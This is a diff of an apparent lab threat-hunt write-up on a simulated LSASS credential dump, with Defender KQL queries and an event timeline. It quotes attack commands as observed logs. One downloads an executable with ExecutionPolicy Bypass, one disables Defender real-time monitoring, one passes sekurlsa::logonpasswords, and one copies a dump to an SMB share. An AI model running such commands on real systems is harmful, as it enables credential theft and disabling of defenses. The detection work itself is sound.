@@ -1,6 +1,8 @@
 # Threat Event: Credential Dumping via LSASS Access  
 **Simulated Credential Theft Using PowerShell and Fake Mimikatz Tool**
 
+![image](https://github.com/user-attachments/assets/47315c4e-f225-45ae-8ca9-a0850feb1e12)
+
 
 - [Scenario Creation](https://github.com/aduragbemioo/Threat-Hunt-Scenario-Credential-Dumping-via-LSASS-Access/blob/main/scenario.md)
 
@@ -39,7 +41,8 @@ DeviceFileEvents
 | where FileName endswith ".exe"
 | project Timestamp, DeviceName, InitiatingProcessAccountName, FileName, FolderPath, ActionType
 ```
-Found creation of mimi-sim.exe under the user profile on device ad-stig-impleme.
+Found creation of mimi-sim.exe under a user profile on device ad-stig-impleme.
+![image](https://github.com/user-attachments/assets/5a29e839-379c-41a3-85f9-77f6b8afb1b7)
 
 
 🧠 2. Execution of Simulated Mimikatz with sekurlsa Argument
@@ -50,7 +53,10 @@ DeviceProcessEvents
 | where ProcessCommandLine has_any ("mimi-sim.exe", "sekurlsa")
 | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
 ```
-The actual executable is fake, so it didn't run, but we see PowerShell initiating the command:powershell.exe -ExecutionPolicy Bypass -Command ...
+The actual executable is fake, so it didn't run, but we see PowerShell initiating the command: `"powershell.exe" -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/aduragbemioo/Threat-Hunt-Scenario-Credential-Dumping-via-LSASS-Access/refs/heads/main/mimi-sim.exe -OutFile C:\Users\vullab\Downloads\mimi-sim.exe`
+![image](https://github.com/user-attachments/assets/321fb2e6-c432-43aa-993c-4823dd902bbe)
+
+
 
 🗂️ 3. LSASS Dump File Creation Detection
 What is LSASS Dumping?
@@ -67,8 +73,9 @@ DeviceFileEvents
 | where FolderPath has_any ("\\Temp\\", "\\AppData\\Local\\Temp\\", "\\Desktop\\")
 | project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine, ActionType
 ```
-- The simulated script created a fake lsass.dmp on the desktop.
+- The simulated script created a fake lsass.dmp on the `desktop` and `\AppData\Local\Temp` folders
 - The event was logged after mimi-sim.exe was dropped.
+![image](https://github.com/user-attachments/assets/a598ffa8-e292-4a14-a647-28b1d86c895d)
 
 📤 4. Simulated Exfiltration to Remote Network
 ```kusto
@@ -82,6 +89,9 @@ DeviceNetworkEvents
 - Simulated copy to a private IP (e.g., \\192.168.1.99\shared) caused network activity.
 - No actual exfiltration occurred, but logs reflect the attempt.
 
+![image](https://github.com/user-attachments/assets/cf7d5bcd-5814-4ade-8a7d-604c50f59fb8)
+
+
 🛡️ 5. Defender Realtime Monitoring Tampering Attempt
 
 ```kusto
@@ -91,6 +101,9 @@ DeviceProcessEvents
 | project Timestamp, DeviceName, AccountName, ProcessCommandLine
 ```
 - PowerShell attempted to run: Set-MpPreference -DisableRealtimeMonitoring $true
+
+![image](https://github.com/user-attachments/assets/6cdb4645-55aa-4782-912b-b603bfddd2f3)
+
 - Defender logged the attempt, useful for detecting tampering efforts.
 
 
@@ -98,15 +111,15 @@ DeviceProcessEvents
 
 ### 1. Suspicious File Drop
 
-- **Timestamp:** Timestamp from `DeviceFileEvents`  
+- **Timestamp:** 2025-06-25T19:15:18.3442829Z 
 - **Event:** Dropped `mimi-sim.exe` into the Downloads directory via PowerShell.  
-- **Path:** Likely under `C:\Users\*\Downloads\` or similar user-controlled folder.  
+- **Folder Path:** Likely under `C:\Users\vullab\Downloads\mimi-sim.exe`  
 
 ---
 
 ### 2. Defender Tampering Attempt
 
-- **Timestamp:** Timestamp from `DeviceProcessEvents`  
+- **Timestamp:** 2025-06-25T19:16:38.3626718Z
 - **Event:** PowerShell attempted to disable Windows Defender’s Real-Time Protection.  
 - **Command Line:** `Set-MpPreference -DisableRealtimeMonitoring $true`  
 
@@ -114,7 +127,7 @@ DeviceProcessEvents
 
 ### 3. Simulated Credential Dump Execution
 
-- **Timestamp:** Timestamp from `DeviceProcessEvents`  
+- **Timestamp:** 2025-06-25T19:56:37.7992988Z
 - **Event:** Execution of fake Mimikatz logic via PowerShell.  
 - **Command Line:** `powershell.exe -ExecutionPolicy Bypass -Command "sekurlsa::logonpasswords"`  
 
@@ -122,18 +135,18 @@ DeviceProcessEvents
 
 ### 4. LSASS Memory Dump File Created
 
-- **Timestamp:** Timestamp from `DeviceFileEvents`  
+- **Timestamp:** 2025-06-25T19:16:43.2317559Z and 2025-06-25T23:26:21.5826554Z
 - **Event:** Simulated creation of `lsass.dmp` representing a memory dump of LSASS.  
-- **Path:** `C:\Users\<User>\Desktop\lsass.dmp` or `%TEMP%\lsass.dmp`  
+- **Path:** `C:\Users\vullab\AppData\Local\Temp\lsass.dmp` and `C:\Users\vullab\Desktop\lsass.dmp`  
 
 ---
 
 ### 5. Simulated Exfiltration Attempt
 
-- **Timestamp:** Timestamp from `DeviceNetworkEvents`  
+- **Timestamp:** 2025-06-25T19:17:04.3343329Z and 2025-06-25T19:17:05.4279126Z
 - **Event:** PowerShell attempted to copy the dump file to a remote share over SMB.  
 - **Remote IP:** `192.168.1.99` (simulated private IP for testing)  
-- **Port:** Non-standard (not 80/443), likely SMB (445) or test port  
+- **Port:** SMB (445), SMB (139)
 
 ---
 
